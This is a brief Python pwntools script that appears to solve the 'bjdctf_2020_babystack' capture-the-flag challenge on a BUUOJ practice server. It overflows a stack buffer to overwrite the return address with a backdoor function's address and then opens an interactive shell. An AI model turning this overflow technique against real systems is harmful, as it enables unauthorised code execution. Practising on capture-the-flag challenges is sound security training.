from pwn import *
#io = process("./bjdctf_2020_babystack")
io = remote('node3.buuoj.cn',26217)
context(log_level='DEBUG')
io.recv()
back_door = 0x004006E6 
io.sendline("100")#或者这里改为-1
io.recv()
payload = 'a'*0x18+p64(back_door)+p64(0xdeadbeef)
io.sendline(payload)
io.interactive()